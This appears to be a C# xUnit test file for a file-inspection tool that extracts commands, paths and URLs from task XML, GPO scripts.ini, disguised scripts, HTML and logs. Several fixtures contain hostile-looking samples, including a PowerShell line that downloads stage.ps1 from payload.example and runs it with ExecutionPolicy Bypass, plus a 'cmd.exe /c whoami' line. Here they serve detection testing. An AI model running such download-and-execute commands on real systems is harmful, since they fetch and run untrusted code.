using Xunit;

namespace FileInspectorX.Tests;

public class ReferencesTests
{
    [Fact]
    public void Extract_TaskScheduler_Exec_CommandAndArgs()
    {
        string xml = "<Task><Actions><Exec><Command>cmd.exe</Command><Arguments>\"C:/Tools/do.bat\" https://example.com/x</Arguments></Exec></Actions></Task>";
        var p = Path.GetTempFileName() + ".xml";
        try {
            File.WriteAllText(p, xml);
            var a = FileInspector.Analyze(p);
            Assert.NotNull(a.References);
            Assert.Contains(a.References!, r => r.Kind == ReferenceKind.Command && r.Value.Contains("cmd.exe"));
            Assert.Contains(a.References!, r => r.Kind == ReferenceKind.FilePath && r.Value.Contains("do.bat"));
            Assert.Contains(a.References!, r => r.Kind == ReferenceKind.Url && r.Value.StartsWith("https://"));
        } finally { try { File.Delete(p); } catch { } }
    }

    [Fact]
    public void Extract_Gpo_ScriptsIni_CmdAndParams()
    {
        string ini = """
        [Startup]
        0Cmd=\\\\server\\share\\script.ps1
        0Parameters=-File C:\\Windows\\Temp\\payload.ps1
        1Cmd=%SystemRoot%\\System32\\wscript.exe
        1Parameters=//B //Nologo "C:\\Scripts\\login.vbs"
        """;
        var p = Path.GetTempFileName() + ".ini";
        try {
            File.WriteAllText(p, ini);
            var a = FileInspector.Analyze(p);
            Assert.NotNull(a.References);
            Assert.Contains(a.References!, r => r.Kind == ReferenceKind.FilePath && r.Value.StartsWith("\\\\"));
            // Ensure we extracted both UNC and local paths from parameters and commands
            Assert.Contains(a.References!, r => r.Kind == ReferenceKind.Command || r.Kind == ReferenceKind.FilePath);
        } finally { try { File.Delete(p); } catch { } }
    }

    [Fact]
    public void Extract_TaskScheduler_DoesNotFalsePositive_OnGenericXml()
    {
        string xml = "<Config><Command>cmd.exe</Command><Arguments>/c whoami</Arguments></Config>";
        var p = Path.GetTempFileName() + ".xml";
        try {
            File.WriteAllText(p, xml);
            var a = FileInspector.Analyze(p);
            var refs = a.References ?? Array.Empty<Reference>();
            Assert.DoesNotContain(refs, r => (r.SourceTag ?? string.Empty).StartsWith("task:", StringComparison.OrdinalIgnoreCase));
        } finally { try { File.Delete(p); } catch { } }
    }

    [Fact]
    public void Extract_ScriptReferences_RespectsReadCap()
    {
        var p = Path.GetTempFileName() + ".ps1";
        var early = "https://early.example.com/a";
        var late = "https://late.example.com/z";
        try {
            var text = "$u = '" + early + "'\n" + new string('x', 600_000) + "\n$v = '" + late + "'\n";
            File.WriteAllText(p, text);
            var a = FileInspector.Analyze(p);
            var refs = a.References ?? Array.Empty<Reference>();
            Assert.Contains(refs, r => r.Kind == ReferenceKind.Url && string.Equals(r.Value, early, StringComparison.OrdinalIgnoreCase));
            Assert.DoesNotContain(refs, r => r.Kind == ReferenceKind.Url && string.Equals(r.Value, late, StringComparison.OrdinalIgnoreCase));
        } finally { try { File.Delete(p); } catch { } }
    }

    [Fact]
    public void Extract_ScriptReferences_From_Disguised_Text_File_Uses_Detected_Type()
    {
        var p = Path.GetTempFileName() + ".txt";
        try
        {
            File.WriteAllText(p, """
                Invoke-WebRequest -Uri https://payload.example/stage.ps1 -OutFile C:\Windows\Temp\stage.ps1
                Start-Process powershell -ArgumentList "-ExecutionPolicy Bypass -File C:\Windows\Temp\stage.ps1"
                """);

            var a = FileInspector.Analyze(p);
            var refs = a.References ?? Array.Empty<Reference>();

            Assert.Equal("ps1", a.DetectedExtension);
            Assert.Contains(refs, r => r.Kind == ReferenceKind.Url && string.Equals(r.Value, "https://payload.example/stage.ps1", StringComparison.OrdinalIgnoreCase));
            Assert.Contains(refs, r => string.Equals(r.SourceTag, "script:ps1", StringComparison.OrdinalIgnoreCase));
        }
        finally { try { File.Delete(p); } catch { } }
    }

    [Fact]
    public void Extract_HtmlReferences_From_Disguised_Text_File_Uses_Detected_Type()
    {
        var p = Path.GetTempFileName() + ".txt";
        try
        {
            File.WriteAllText(p, """
                <html><body>
                <a href="https://contoso.example/report">report</a>
                <script>fetch("https://payload.example/app.js");</script>
                </body></html>
                """);

            var a = FileInspector.Analyze(p);
            var refs = a.References ?? Array.Empty<Reference>();

            Assert.Equal("html", a.DetectedExtension);
            Assert.Contains(refs, r => r.Kind == ReferenceKind.Url && string.Equals(r.Value, "https://contoso.example/report", StringComparison.OrdinalIgnoreCase));
            Assert.Contains(refs, r => string.Equals(r.SourceTag, "html:href", StringComparison.OrdinalIgnoreCase));
        }
        finally { try { File.Delete(p); } catch { } }
    }

    [Fact]
    public void Extract_EventTextLog_References_From_Generic_Log_Text()
    {
        var p = Path.GetTempFileName() + ".log";
        try
        {
            File.WriteAllBytes(p, System.Text.Encoding.UTF8.GetBytes(
                "Event[0]\r\n" +
                "  Log Name: Application\r\n" +
                "  Source: Example.Service\r\n" +
                "  Event ID: 0\r\n" +
                "  Level: Error\0\r\n" +
                "  Description:\r\n" +
                "Failure reaching https://contoso.example:443/ from \\\\fileserver\\drop\\payload.ps1\r\n"));

            var a = FileInspector.Analyze(p);
            var refs = a.References ?? Array.Empty<Reference>();

            Assert.Equal("log", a.DetectedExtension);
            Assert.Contains(refs, r => r.Kind == ReferenceKind.Url && string.Equals(r.Value, "https://contoso.example:443/", StringComparison.OrdinalIgnoreCase));
            Assert.Contains(refs, r => r.Kind == ReferenceKind.FilePath && string.Equals(r.Value, "\\\\fileserver\\drop", StringComparison.OrdinalIgnoreCase));
            Assert.Contains(refs, r => string.Equals(r.SourceTag, "log:event-txt", StringComparison.OrdinalIgnoreCase));
        }
        finally { try { File.Delete(p); } catch { } }
    }

    [Fact]
    public void Extract_PlainLog_References_From_Generic_Log_Text()
    {
        var p = Path.GetTempFileName() + ".log";
        try
        {
            File.WriteAllText(p, """
                2026-03-17 09:12:00 ERROR failed downloading https://payload.example/app.msi
                2026-03-17 09:12:01 ERROR copied from \\fileserver\share\installer.msi
                """);

            var a = FileInspector.Analyze(p);
            var refs = a.References ?? Array.Empty<Reference>();

            Assert.Contains(refs, r => r.Kind == ReferenceKind.Url && string.Equals(r.Value, "https://payload.example/app.msi", StringComparison.OrdinalIgnoreCase));
            Assert.Contains(refs, r => r.Kind == ReferenceKind.FilePath && string.Equals(r.Value, "\\\\fileserver\\share", StringComparison.OrdinalIgnoreCase));
            Assert.Contains(refs, r => string.Equals(r.SourceTag, "log:text", StringComparison.OrdinalIgnoreCase));
        }
        finally { try { File.Delete(p); } catch { } }
    }
}
